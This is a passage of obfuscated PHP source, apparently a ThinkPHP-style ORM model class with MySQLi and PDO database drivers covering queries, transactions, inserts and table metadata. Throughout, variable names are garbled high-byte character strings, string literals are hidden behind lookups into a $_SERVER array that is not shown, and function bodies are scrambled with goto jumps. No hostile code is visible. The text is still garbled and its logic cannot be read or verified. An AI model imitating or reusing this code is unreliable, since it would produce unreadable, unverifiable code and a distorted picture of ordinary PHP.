$fò›İß±Ï); if (!is_numeric($bõŒÎéŒ©)) { $bõŒÎéŒ© = strtotime($bõŒÎéŒ©); } if (!is_numeric($a±‰­Îƒ¾¿)) { $a±‰­Îƒ¾¿ = strtotime($a±‰­Îƒ¾¿); } return NOW_TIME >= $bõŒÎéŒ© && NOW_TIME <= $a±‰­Îƒ¾¿; case $aŒòáßõÜ[325]: return in_array(get_client_ip(), explode($aŒòáßõÜ[47], $fò›İß±Ï)); case $aŒòáßõÜ[326]: return !in_array(get_client_ip(), explode($aŒòáßõÜ[47], $fò›İß±Ï)); case $aŒòáßõÜ[313]: default: return $this->regex($DÒ‡È¿Ê•÷, $fò›İß±Ï); } } public function query($açË“ÇÊ²Š, $DŸ‰É˜ãÛÀ = false) { $Aªì¿—”ƒ» =& $_SERVER[¢à]; if (!is_bool($DŸ‰É˜ãÛÀ) && !is_array($DŸ‰É˜ãÛÀ)) { $DŸ‰É˜ãÛÀ = func_get_args(); array_shift($DŸ‰É˜ãÛÀ); } $açË“ÇÊ²Š = str_replace(array($Aªì¿—”ƒ»[214], $Aªì¿—”ƒ»[327]), $Aªì¿—”ƒ»[50], $açË“ÇÊ²Š); $açË“ÇÊ²Š = $this->parseSql($açË“ÇÊ²Š, $DŸ‰É˜ãÛÀ); return $this->db->query($açË“ÇÊ²Š); } public function execute($aá“³‘ñ–³, $Câùé¼­Èî = false) { if (!is_bool($Câùé¼­Èî) && !is_array($Câùé¼­Èî)) { $Câùé¼­Èî = func_get_args(); array_shift($Câùé¼­Èî); } $aá“³‘ñ–³ = $this->parseSql($aá“³‘ñ–³, $Câùé¼­Èî); return $this->db->execute($aá“³‘ñ–³); } protected function parseSql($EƒÊ¶ğ•áØ, $bŸÅ» îÓ) { $C¶—™ö´Ìµ =& $_SERVER[¢à]; if (!0 === $bŸÅ» îÓ) { $a™ØĞÑ¬ = $this->_parseOptions(); $EƒÊ¶ğ•áØ = $this->db->parseSql($EƒÊ¶ğ•áØ, $a™ØĞÑ¬); } elseif (is_array($bŸÅ» îÓ)) { $bŸÅ» îÓ = array_map(array($this->db, $C¶—™ö´Ìµ[328]), $bŸÅ» îÓ); $EƒÊ¶ğ•áØ = vsprintf($EƒÊ¶ğ•áØ, $bŸÅ» îÓ); } else { $EƒÊ¶ğ•áØ = strtr($EƒÊ¶ğ•áØ, array($C¶—™ö´Ìµ[329] => $this->getTableName(), $C¶—™ö´Ìµ[330] => think_config($C¶—™ö´Ìµ[229]))); } $this->db->setModel($this->name); return $EƒÊ¶ğ•áØ; } public function db($A”çŞñÔñÛ = '', $d©³âèêâæ = '', $b†åŒ²ë˜• = array()) { goto B³‘Şìæ; c³Ô´’Î: if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; goto AÈ®ñÊ•´ù; E±Š„Î³–: static $FøÏÔ‡é–— = array(); if (!isset($FøÏÔ‡é–—[$A”çŞñÔñÛ]) || isset($FøÏÔ‡é–—[$A”çŞñÔñÛ]) && $d©³âèêâæ && $E±Î…³…Ğê[$A”çŞñÔñÛ] != $d©³âèêâæ) { if (!empty($d©³âèêâæ) && is_string($d©³âèêâæ) && !1 === strpos($d©³âèêâæ, $cÑˆæôŒÉİ[8])) { $d©³âèêâæ = think_config($d©³âèêâæ); } $FøÏÔ‡é–—[$A”çŞñÔñÛ] = Db::getInstance($d©³âèêâæ); } elseif (NULL === $d©³âèêâæ) { $FøÏÔ‡é–—[$A”çŞñÔñÛ]->close(); unset($FøÏÔ‡é–—[$A”çŞñÔñÛ]); return; } if (!empty($b†åŒ²ë˜•)) { if (is_string($b†åŒ²ë˜•)) { parse_str($b†åŒ²ë˜•, $b†åŒ²ë˜•); } foreach ($b†åŒ²ë˜• as $dŸéé÷ÕÜ¥ => $BÇœ ‰¬¾‡) { $this->setProperty($dŸéé÷ÕÜ¥, $BÇœ ‰¬¾‡); } } goto Cä°¼ÔµäÇ; B³‘Şìæ: $cÑˆæôŒÉİ =& $_SERVER[¢à]; if ($cÑˆæôŒÉİ[33] === $A”çŞñÔñÛ && $this->db) { return $this->db; } static $E±Î…³…Ğê = array(); goto E±Š„Î³–; Cä°¼ÔµäÇ: $E±Î…³…Ğê[$A”çŞñÔñÛ] = $d©³âèêâæ; $this->db = $FøÏÔ‡é–—[$A”çŞñÔñÛ]; $this->_after_db(); goto c³Ô´’Î; AÈ®ñÊ•´ù: } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $AÚ‰Î­ì = get_class($this); if ($AÚ‰Î­ì == $_SERVER[¢à][331]) { return $this->name; } $this->name = substr($AÚ‰Î­ì, 0, -5); } return $this->name; } public function getTableName() { $A›Òîº„¡Ø =& $_SERVER[¢à]; if (empty($this->trueTableName)) { $fº•÷Ò»‰ = !empty($this->tablePrefix) ? $this->tablePrefix : $A›Òîº„¡Ø[33]; if (!empty($this->tableName)) { $fº•÷Ò»‰ .= $this->tableName; } else { $fº•÷Ò»‰ .= think_parse_name($this->name); } $this->trueTableName = strtolower($fº•÷Ò»‰); } return (!empty($this->dbName) ? $this->dbName . $A›Òîº„¡Ø[93] : $A›Òîº„¡Ø[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $E¾‹¹ˆù– =& $_SERVER[¢à]; return isset($this->fields[$E¾‹¹ˆù–[236]]) ? $this->fields[$E¾‹¹ˆù–[236]] : $this->pk; } public function getDbFields() { $aºÆÍó«• =& $_SERVER[¢à]; if (isset($this->options[$aºÆÍó«•[264]])) { $FæÔ‘„‰Óİ = $this->db->getFields($this->options[$aºÆÍó«•[264]]); return $FæÔ‘„‰Óİ ? array_keys($FæÔ‘„‰Óİ) : !1; } if ($this->fields) { $FæÔ‘„‰Óİ = $this->fields; unset($FæÔ‘„‰Óİ[$aºÆÍó«•[235]], $FæÔ‘„‰Óİ[$aºÆÍó«•[236]], $FæÔ‘„‰Óİ[$aºÆÍó«•[237]], $FæÔ‘„‰Óİ[$aºÆÍó«•[234]]); return $FæÔ‘„‰Óİ; } return !1; } public function data($Cäó½Èµ¬­ = '') { $cÚÅ¡åÆ•× =& $_SERVER[¢à]; if ($cÚÅ¡åÆ•×[33] === $Cäó½Èµ¬­ && !empty($this->data)) { return $this->data; } if (is_object($Cäó½Èµ¬­)) { $Cäó½Èµ¬­ = get_object_vars($Cäó½Èµ¬­); } elseif (is_string($Cäó½Èµ¬­)) { parse_str($Cäó½Èµ¬­, $Cäó½Èµ¬­); } elseif (!is_array($Cäó½Èµ¬­)) { think_exception(think_lang($cÚÅ¡åÆ•×[256])); } $this->data = $Cäó½Èµ¬­; return $this; } public function join($DØ£©•¯¼) { $BôçâíÀ =& $_SERVER[¢à]; if (is_array($DØ£©•¯¼)) { $this->options[$BôçâíÀ[267]] = $DØ£©•¯¼; } elseif (!empty($DØ£©•¯¼)) { $this->options[$BôçâíÀ[267]][] = $DØ£©•¯¼; } return $this; } public function union($B¾ùóŠ…‘, $AŒàñïÇ = false) { goto Eé„«‚‹ãã; Eé„«‚‹ãã: $C§™£øİË =& $_SERVER[¢à]; if (empty($B¾ùóŠ…‘)) { return $this; } if ($AŒàñïÇ) { $this->options[$C§™£øİË[332]][$C§™£øİË[333]] = !0; } goto bŠ™ˆØİì¹; bŠ™ˆØİì¹: if (is_object($B¾ùóŠ…‘)) { $B¾ùóŠ…‘ = get_object_vars($B¾ùóŠ…‘); } if (is_string($B¾ùóŠ…‘)) { $E…ºÅÚğˆë = $B¾ùóŠ…‘; } elseif (is_array($B¾ùóŠ…‘)) { if (isset($B¾ùóŠ…‘[0])) { $this->options[$C§™£øİË[332]] = array_merge($this->options[$C§™£øİË[332]], $B¾ùóŠ…‘); return $this; } else { $E…ºÅÚğˆë = $B¾ùóŠ…‘; } } else { think_exception(think_lang($C§™£øİË[256])); } $this->options[$C§™£øİË[332]][] = $E…ºÅÚğˆë; goto DÁî¨ŸÁôÌ; DÁî¨ŸÁôÌ: return $this; goto C¿±É›‹Ì¬; C¿±É›‹Ì¬: } public function cache($FÁÔ¯¥‰± = true, $A†™„¸èé = null, $fé‘Ïëšì™ = '') { $FéÇ…¿™‰Ö =& $_SERVER[¢à]; if (!1 !== $FÁÔ¯¥‰±) { $this->options[$FéÇ…¿™‰Ö[334]] = array($FéÇ…¿™‰Ö[89] => $FÁÔ¯¥‰±, $FéÇ…¿™‰Ö[324] => $A†™„¸èé, $FéÇ…¿™‰Ö[29] => $fé‘Ïëšì™); } return $this; } public function field($FõÌ¥»‡ñ, $BÀ‡ìÎÑ˜† = false) { $a¥äî¦Æö =& $_SERVER[¢à]; if (!0 === $FõÌ¥»‡ñ) { $f¶œĞå½¡Ó = $this->getDbFields(); $FõÌ¥»‡ñ = $f¶œĞå½¡Ó ? $f¶œĞå½¡Ó : $a¥äî¦Æö[173]; } elseif ($BÀ‡ìÎÑ˜†) { if (is_string($FõÌ¥»‡ñ)) { $FõÌ¥»‡ñ = explode($a¥äî¦Æö[47], $FõÌ¥»‡ñ); } $f¶œĞå½¡Ó = $this->getDbFields(); $FõÌ¥»‡ñ = $f¶œĞå½¡Ó ? array_diff($f¶œĞå½¡Ó, $FõÌ¥»‡ñ) : $FõÌ¥»‡ñ; } $this->options[$a¥äî¦Æö[258]] = $FõÌ¥»‡ñ; return $this; } public function scope($CêŠÓĞ„…À = '', $dÔ÷×‚Ü§© = NULL) { $D…½ËôÌ¼ì =& $_SERVER[¢à]; if ($D…½ËôÌ¼ì[33] === $CêŠÓĞ„…À) { if (isset($this->_scope[$D…½ËôÌ¼ì[34]])) { $c†Ï½²áĞ = $this->_scope[$D…½ËôÌ¼ì[34]]; } else { return $this; } } elseif (is_string($CêŠÓĞ„…À)) { $dÆæÃèš… = explode($D…½ËôÌ¼ì[47], $CêŠÓĞ„…À); $c†Ï½²áĞ = array(); foreach ($dÆæÃèš… as $cå×ƒÍ“ˆ¦) { if (!isset($this->_scope[$cå×ƒÍ“ˆ¦])) { continue; } $c†Ï½²áĞ = array_merge($c†Ï½²áĞ, $this->_scope[$cå×ƒÍ“ˆ¦]); } if (!empty($dÔ÷×‚Ü§©) && is_array($dÔ÷×‚Ü§©)) { $c†Ï½²áĞ = array_merge($c†Ï½²áĞ, $dÔ÷×‚Ü§©); } } elseif (is_array($CêŠÓĞ„…À)) { $c†Ï½²áĞ = $CêŠÓĞ„…À; } if (is_array($c†Ï½²áĞ) && !empty($c†Ï½²áĞ)) { $this->options = array_merge($this->options, array_change_key_case($c†Ï½²áĞ)); } return $this; } public function where($Eƒ®åÉ‹È†, $aØƒ¾ï©ÒÄ = null) { $A´ÙšÆä·ø =& $_SERVER[¢à]; if (!is_null($aØƒ¾ï©ÒÄ) && is_string($Eƒ®åÉ‹È†)) { if (!is_array($aØƒ¾ï©ÒÄ)) { $aØƒ¾ï©ÒÄ = func_get_args(); array_shift($aØƒ¾ï©ÒÄ); } $aØƒ¾ï©ÒÄ = array_map(array($this->db, $A´ÙšÆä·ø[328]), $aØƒ¾ï©ÒÄ); $Eƒ®åÉ‹È† = vsprintf($Eƒ®åÉ‹È†, $aØƒ¾ï©ÒÄ); } elseif (is_object($Eƒ®åÉ‹È†)) { $Eƒ®åÉ‹È† = get_object_vars($Eƒ®åÉ‹È†); } elseif (is_array($Eƒ®åÉ‹È†)) { foreach ($Eƒ®åÉ‹È† as $eÕİ¥À’‰ö => $D•Ó¢×Åƒ) { if ((is_numeric($eÕİ¥À’‰ö) || !$eÕİ¥À’‰ö) && is_string($D•Ó¢×Åƒ)) { think_trace($A´ÙšÆä·ø[335], $A´ÙšÆä·ø[33], $A´ÙšÆä·ø[46]); die; } } } if (is_string($Eƒ®åÉ‹È†) && $A´ÙšÆä·ø[33] != $Eƒ®åÉ‹È†) { $aÅ—§¹Æ = array(); $aÅ—§¹Æ[$A´ÙšÆä·ø[336]] = $Eƒ®åÉ‹È†; $Eƒ®åÉ‹È† = $aÅ—§¹Æ; } if (isset($this->options[$A´ÙšÆä·ø[260]])) { $this->options[$A´ÙšÆä·ø[260]] = array_merge($this->options[$A´ÙšÆä·ø[260]], $Eƒ®åÉ‹È†); } else { $this->options[$A´ÙšÆä·ø[260]] = $Eƒ®åÉ‹È†; } return $this; } public function limit($eé³Íœ¿–¶, $eËÓ„ßÔí = null) { $eÎéæŠ˜´™ =& $_SERVER[¢à]; $this->options[$eÎéæŠ˜´™[277]] = is_null($eËÓ„ßÔí) ? $eé³Íœ¿–¶ : $eé³Íœ¿–¶ . $eÎéæŠ˜´™[47] . $eËÓ„ßÔí; return $this; } public function page($Fƒ¢£¢ä , $DÔªìà´µ = null) { $C©ç¾Ü¯ =& $_SERVER[¢à]; $this->options[$C©ç¾Ü¯[337]] = is_null($DÔªìà´µ) ? $Fƒ¢£¢ä  : $Fƒ¢£¢ä  . $C©ç¾Ü¯[47] . $DÔªìà´µ; return $this; } public function comment($f›æ–‡Ğ) { $this->options[$_SERVER[¢à][338]] = $f›æ–‡Ğ; return $this; } public function setProperty($eÅ¹Í¨ Æå, $aÃ–é¨¨ô¶) { if (property_exists($this, $eÅ¹Í¨ Æå)) { $this->{$eÅ¹Í¨ Æå} = $aÃ–é¨¨ô¶; } return $this; } } goto eéø‰¶à™”; F–¬™½Ù…Ä: class DbMysqli extends Db { public function __construct($FƒŒŠˆ§Ü¿ = '') { $aÕ­É²¯Éè =& $_SERVER[¢à]; if (!extension_loaded($aÕ­É²¯Éè[727])) { think_exception(think_lang($aÕ­É²¯Éè[10]) . $aÕ­É²¯Éè[823]); } if (!empty($FƒŒŠˆ§Ü¿)) { $this->config = $FƒŒŠˆ§Ü¿; if (empty($this->config[$aÕ­É²¯Éè[13]])) { $this->config[$aÕ­É²¯Éè[13]] = $aÕ­É²¯Éè[33]; } } } public function connect($a¦‰½¯·Â = '', $Fè‚í·ç‹ñ = 0) { $E„²ÙÕ£Ê› =& $_SERVER[¢à]; if (!isset($this->linkID[$Fè‚í·ç‹ñ])) { goto dõáœ¨Ç›…; dõáœ¨Ç›…: if (empty($a¦‰½¯·Â)) { $a¦‰½¯·Â = $this->config; } $this->linkID[$Fè‚í·ç‹ñ] = new mysqli($a¦‰½¯·Â[$E„²ÙÕ£Ê›[797]], $a¦‰½¯·Â[$E„²ÙÕ£Ê›[799]], $a¦‰½¯·Â[$E„²ÙÕ£Ê›[800]], $a¦‰½¯·Â[$E„²ÙÕ£Ê›[17]], $a¦‰½¯·Â[$E„²ÙÕ£Ê›[798]] ? intval($a¦‰½¯·Â[$E„²ÙÕ£Ê›[798]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto BÅÁÎæ…; f»‹ŞÂî¢: $this->connected = !0; if (1 != think_config($E„²ÙÕ£Ê›[18])) { unset($this->config); } goto C–¸÷Ô‚éÖ; BÅÁÎæ…: $b‚Ùöîõ­ = $this->linkID[$Fè‚í·ç‹ñ]->server_version; $this->linkID[$Fè‚í·ç‹ñ]->query($E„²ÙÕ£Ê›[801] . think_config($E„²ÙÕ£Ê›[802]) . $E„²ÙÕ£Ê›[55]); if ($b‚Ùöîõ­ > $E„²ÙÕ£Ê›[803]) { $this->linkID[$Fè‚í·ç‹ñ]->query($E„²ÙÕ£Ê›[804]); } goto f»‹ŞÂî¢; C–¸÷Ô‚éÖ: } return $this->linkID[$Fè‚í·ç‹ñ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($d•İ²’›ä) { goto f»µÎŞ²èå; aŒàßìö»Ü: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto föÔğ›Ğ…‚; f»µÎŞ²èå: $fœ¶ö­Ûì† =& $_SERVER[¢à]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto F²¶¯Œ›Ë‰; F²¶¯Œ›Ë‰: $this->queryStr = $d•İ²’›ä; if ($this->queryID) { $this->free(); } think_action_status($fœ¶ö­Ûì†[19], 1); goto Cå™É¡ï’ç; Cå™É¡ï’ç: think_status($fœ¶ö­Ûì†[20]); $this->queryID = $this->_linkID->query($d•İ²’›ä); if ($this->_linkID->more_results()) { while (($d‡­½Š½æ† = $this->_linkID->next_result()) != NULL) { $d‡­½Š½æ†->free_result(); } } goto aŒàßìö»Ü; föÔğ›Ğ…‚: } public function execute($aÂÉ°…‘—Î) { goto a•«ª·Œ…Ä; a•«ª·Œ…Ä: $f”ÏŞ†¿‡ =& $_SERVER[¢à]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto d¡Â‹àæ; a†¿«ò¢”: think_status($f”ÏŞ†¿‡[20]); $d…ÌÏø·²ì = $this->_linkID->query($aÂÉ°…‘—Î); $this->debug(); goto f±¢£³ŠÍ; f±¢£³ŠÍ: if (!1 === $d…ÌÏø·²ì) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto dä£ï˜ÜÔ˜; d¡Â‹àæ: $this->queryStr = $aÂÉ°…‘—Î; if ($this->queryID) { $this->free(); } think_action_status($f”ÏŞ†¿‡[21], 1); goto a†¿«ò¢”; dä£ï˜ÜÔ˜: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÊä¯ÍÂ° = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$BÊä¯ÍÂ°) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $bÔ†³–ëÚ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$bÔ†³–ëÚ) { $this->error(); return !1; } } return !0; } private function getAll() { $eñˆ¹ÀªÂ = array(); if ($this->numRows > 0) { for ($c¹Í—ÉÓï° = 0; $c¹Í—ÉÓï° < $this->numRows; $c¹Í—ÉÓï°++) { $eñˆ¹ÀªÂ[$c¹Í—ÉÓï°] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $eñˆ¹ÀªÂ; } public function getFields($bÙêˆŠ¬Õ) { $aØŸ½î¢Ç‰ =& $_SERVER[¢à]; $fÊ“Ãœ = $this->query($aØŸ½î¢Ç‰[808] . $this->parseKey($bÙêˆŠ¬Õ)); $Eè» ­¼¥ = array(); if ($fÊ“Ãœ) { foreach ($fÊ“Ãœ as $f®Ò¬ãÄ‰ => $AÏÑÏ§¸˜İ) { $Eè» ­¼¥[$AÏÑÏ§¸˜İ[$aØŸ½î¢Ç‰[27]]] = array($aØŸ½î¢Ç‰[28] => $AÏÑÏ§¸˜İ[$aØŸ½î¢Ç‰[27]], $aØŸ½î¢Ç‰[29] => $AÏÑÏ§¸˜İ[$aØŸ½î¢Ç‰[30]], $aØŸ½î¢Ç‰[31] => (bool) ($AÏÑÏ§¸˜İ[$aØŸ½î¢Ç‰[32]] === $aØŸ½î¢Ç‰[33]), $aØŸ½î¢Ç‰[34] => $AÏÑÏ§¸˜İ[$aØŸ½î¢Ç‰[35]], $aØŸ½î¢Ç‰[36] => strtolower($AÏÑÏ§¸˜İ[$aØŸ½î¢Ç‰[37]]) == $aØŸ½î¢Ç‰[38], $aØŸ½î¢Ç‰[39] => strtolower($AÏÑÏ§¸˜İ[$aØŸ½î¢Ç‰[40]]) == $aØŸ½î¢Ç‰[41]); } } return $Eè» ­¼¥; } public function getTables($D‰ò¬Œ£‹ = '') { $AØ™ŞÎñäß =& $_SERVER[¢à]; $a¶„ÚÎ’ Ù = !empty($D‰ò¬Œ£‹) ? $AØ™ŞÎñäß[810] . $D‰ò¬Œ£‹ : $AØ™ŞÎñäß[811]; $fÅ¡ëÅÎì‘ = $this->query($a¶„ÚÎ’ Ù); $d±·ğĞº¿Ş = array(); if ($fÅ¡ëÅÎì‘) { foreach ($fÅ¡ëÅÎì‘ as $C İÀù™¦ø => $F±Ìãê…ö) { $d±·ğĞº¿Ş[$C İÀù™¦ø] = current($F±Ìãê…ö); } } return $d±·ğĞº¿Ş; } public function replace($FˆÖ‹Ù“¶, $d¬ÇÕ†ÇèÙ = array()) { $bÓÁå§šÕ– =& $_SERVER[¢à]; foreach ($FˆÖ‹Ù“¶ as $CáöŠŸŒ¼ => $f×ŒÛ‚Ëî) { $bâƒÁìÏ©Í = $this->parseValue($f×ŒÛ‚Ëî); if (is_scalar($bâƒÁìÏ©Í)) { $F–ŞÀ‘”å¼[] = $bâƒÁìÏ©Í; $e½ñÜ©„Ø„[] = $this->parseKey($CáöŠŸŒ¼); } } $A—Ã‚’…± = $bÓÁå§šÕ–[812] . $this->parseTable($d¬ÇÕ†ÇèÙ[$bÓÁå§šÕ–[264]]) . $bÓÁå§šÕ–[813] . implode($bÓÁå§šÕ–[47], $e½ñÜ©„Ø„) . $bÓÁå§šÕ–[814] . implode($bÓÁå§šÕ–[47], $F–ŞÀ‘”å¼) . $bÓÁå§šÕ–[815]; return $this->execute($A—Ã‚’…±); } public function insertAll($A¹êÎğÆå, $aŠ¤éÙª‹Ø = array(), $bÀİéÇÙñè = false) { goto e¥·š¦”¥¿; B­»£ô×ã˜: $dÉ­ÀÜøÏŠ = ($bÀİéÇÙñè ? $cÊëéßÛó[817] : $cÊëéßÛó[818]) . $cÊëéßÛó[819] . $this->parseTable($aŠ¤éÙª‹Ø[$cÊëéßÛó[264]]) . $cÊëéßÛó[813] . implode($cÊëéßÛó[47], $aÎöĞ‹»Ö¨) . $cÊëéßÛó[820] . implode($cÊëéßÛó[47], $Fß‘®¹¢Ğ„); return $this->execute($dÉ­ÀÜøÏŠ); goto fâÁÆø‹â‚; d“·©ÆÊã: $Fß‘®¹¢Ğ„ = array(); foreach ($A¹êÎğÆå as $aä„å»Ä‹…) { $CØÇä¸Äóå = array(); foreach ($aä„å»Ä‹… as $c®Œâ¾¶¸“ => $a¦ƒ‘ïó‚È) { $a¦ƒ‘ïó‚È = $this->parseValue($a¦ƒ‘ïó‚È); if (is_scalar($a¦ƒ‘ïó‚È)) { $CØÇä¸Äóå[] = $a¦ƒ‘ïó‚È; } } $Fß‘®¹¢Ğ„[] = $cÊëéßÛó[245] . implode($cÊëéßÛó[47], $CØÇä¸Äóå) . $cÊëéßÛó[815]; } array_walk($aÎöĞ‹»Ö¨, array($this, $cÊëéßÛó[816])); goto B­»£ô×ã˜; e¥·š¦”¥¿: $cÊëéßÛó =& $_SERVER[¢à]; if (!is_array($A¹êÎğÆå[0])) { return !1; } $aÎöĞ‹»Ö¨ = array_keys($A¹êÎğÆå[0]); goto d“·©ÆÊã; fâÁÆø‹â‚: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $FäÜ¿ï˜ã¤ =& $_SERVER[¢à]; $this->error = $this->_linkID->errno . $FäÜ¿ï˜ã¤[4] . $this->_linkID->error; if ($FäÜ¿ï˜ã¤[33] != $this->queryStr) { $this->error .= LNG($FäÜ¿ï˜ã¤[45]) . $this->queryStr; } think_trace($this->error, $FäÜ¿ï˜ã¤[33], $FäÜ¿ï˜ã¤[46]); return $this->error; } public function escapeString($fÊİ»Äİ½) { if ($this->_linkID) { return $this->_linkID->real_escape_string($fÊİ»Äİ½); } else { return addslashes($fÊİ»Äİ½); } } public function parseKey(&$b—·¾“¤ÜË, $dµ£ëæ“ŞÂ = true) { $dÒÅñê£‡® =& $_SERVER[¢à]; if ($dµ£ëæ“ŞÂ) { $b—·¾“¤ÜË = $this->parseKeyCheck($b—·¾“¤ÜË); } if ($b—·¾“¤ÜË != $dÒÅñê£‡®[173] && !preg_match($dÒÅñê£‡®[821], $b—·¾“¤ÜË)) { $b—·¾“¤ÜË = $dÒÅñê£‡®[822] . trim($b—·¾“¤ÜË, $dÒÅñê£‡®[822]) . $dÒÅñê£‡®[822]; } return $b—·¾“¤ÜË; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($a‚½°åó· = '') { $BÉô×»ÅÂ‚ =& $_SERVER[¢à]; if (!class_exists($BÉô×»ÅÂ‚[824])) { think_exception(think_lang($BÉô×»ÅÂ‚[10]) . $BÉô×»ÅÂ‚[825]); } if (!empty($a‚½°åó·)) { $this->config = $a‚½°åó·; if (empty($this->config[$BÉô×»ÅÂ‚[13]])) { $this->config[$BÉô×»ÅÂ‚[13]] = array(); } } } public function connect($aÎÓè©Ò› = '', $Eå¨ÆÙï…ß = 0) { $bÂêó¶ôßƒ =& $_SERVER[¢à]; if (!isset($this->linkID[$Eå¨ÆÙï…ß])) { goto eìêšÚ¶®Š; BÏ®òµ§: $this->dbType = $this->_getDsnType($aÎÓè©Ò›[$bÂêó¶ôßƒ[826]]); if (in_array($this->dbType, array($bÂêó¶ôßƒ[827], $bÂêó¶ôßƒ[828], $bÂêó¶ôßƒ[829], $bÂêó¶ôßƒ[830]))) { think_exception($bÂêó¶ôßƒ[831] . $this->dbType . $bÂêó¶ôßƒ[832] . $this->dbType . $bÂêó¶ôßƒ[833]); } if (!$this->linkID[$Eå¨ÆÙï…ß]) { think_exception($bÂêó¶ôßƒ[834]); } goto e‹äØŠìŒ´; e‹äØŠìŒ´: $this->linkID[$Eå¨ÆÙï…ß]->exec($bÂêó¶ôßƒ[835] . think_config($bÂêó¶ôßƒ[802])); $this->connected = !0; if (1 != think_config($bÂêó¶ôßƒ[18])) { unset($this->config); } goto CéÉè‡Œì; eìêšÚ¶®Š: if (empty($aÎÓè©Ò›)) { $aÎÓè©Ò› = $this->config; } if ($this->pconnect) { $aÎÓè©Ò›[$bÂêó¶ôßƒ[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$Eå¨ÆÙï…ß] = new PDO($aÎÓè©Ò›[$bÂêó¶ôßƒ[826]], $aÎÓè©Ò›[$bÂêó¶ôßƒ[799]], $aÎÓè©Ò›[$bÂêó¶ôßƒ[800]], $aÎÓè©Ò›[$bÂêó¶ôßƒ[13]]); } catch (PDOException $B©Ö‘ÈÆÁ) { think_exception($B©Ö‘ÈÆÁ->getMessage()); } goto BÏ®òµ§; CéÉè‡Œì: } return $this->linkID[$Eå¨ÆÙï…ß]; } public function free() { $this->PDOStatement = null; } public function query($a¿¾®±„—, $FÚ’Ù­õ‰ù = array()) { goto eÛÅÊ¿Â¦É; dóìàáö«´: think_action_status($AéÈ·©ãÓ¢[19], 1); think_status($AéÈ·©ãÓ¢[20]); $this->PDOStatement = $this->_linkID->prepare($a¿¾®±„—); goto e¾¼“æˆ®¼; eÛÅÊ¿Â¦É: $AéÈ·©ãÓ¢ =& $_SERVER[¢à]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto d‘Ù…èŒ‡; c®ğ›¼¡µ¯: if (!1 === $Fô‰¬Ëé) { $this->error(); return !1; } else { return $this->getAll(); } goto aÊô°¾ø˜; e¾¼“æˆ®¼: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $Fô‰¬Ëé = $this->PDOStatement->execute($FÚ’Ù­õ‰ù); $this->debug(); goto c®ğ›¼¡µ¯; d‘Ù…èŒ‡: $this->queryStr = $a¿¾®±„—; if (!empty($FÚ’Ù­õ‰ù)) { $this->queryStr .= $AéÈ·©ãÓ¢[836] . print_r($FÚ’Ù­õ‰ù, !0) . $AéÈ·©ãÓ¢[837]; } if (!empty($this->PDOStatement)) { $this->free(); } goto dóìàáö«´; aÊô°¾ø˜: } public function execute($fÓ¤ª”ù—Š, $e§¢’Ö©°š = array()) { goto D­™ÄÑˆ; Eäíçã‚¶á: if ($this->dbType == $bÛÂä‰²Ç½[830]) { if (preg_match($bÛÂä‰²Ç½[838], $this->queryStr, $Fß°„º³ã)) { $this->table = think_config($bÛÂä‰²Ç½[839]) . str_ireplace(think_config($bÛÂä‰²Ç½[840]), $bÛÂä‰²Ç½[358], $Fß°„º³ã[2]); $AïÑÄÍÆÆñ = (bool) $this->query($bÛÂä‰²Ç½[841] . strtoupper($this->table) . $bÛÂä‰²Ç½[55]); } } if (!empty($this->PDOStatement)) { $this->free(); } think_action_status($bÛÂä‰²Ç½[21], 1); goto BæÕêÒˆ¶„; D‰‹º»‹ç¸: $B©²¡å‡ÜØ = $this->PDOStatement->execute($e§¢’Ö©°š); $this->debug(); if (!1 === $B©²¡å‡ÜØ) { $this->error(); return !1; } else { $this->numRows = $this->PDOStatement->rowCount(); if ($AïÑÄÍÆÆñ || preg_match($bÛÂä‰²Ç½[842], $fÓ¤ª”ù—Š)) { $this->lastInsID = $this->getLastInsertId(); } return $this->numRows; } goto F—Ëòğ¿äÂ; D­™ÄÑˆ: $bÛÂä‰²Ç½ =& $_SERVER[¢à]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto BìŒôó… ‰; BìŒôó… ‰: $this->queryStr = $fÓ¤ª”ù—Š; if (!empty($e§¢’Ö©°š)) { $this->queryStr .= $bÛÂä‰²Ç½[836] . print_r($e§¢’Ö©°š, !0) . $bÛÂä‰²Ç½[837]; } $AïÑÄÍÆÆñ = !1; goto Eäíçã‚¶á; BæÕêÒˆ¶„: think_status($bÛÂä‰²Ç½[20]); $this->PDOStatement = $this->_linkID->prepare($fÓ¤ª”ù—Š); if (!1 === $this->PDOStatement) { think_exception($this->error()); } goto D‰‹º»‹ç¸; F—Ëòğ¿äÂ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->beginTransaction(); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $D”ö°¨Ü£¢ = $this->_linkID->commit(); $this->transTimes = 0; if 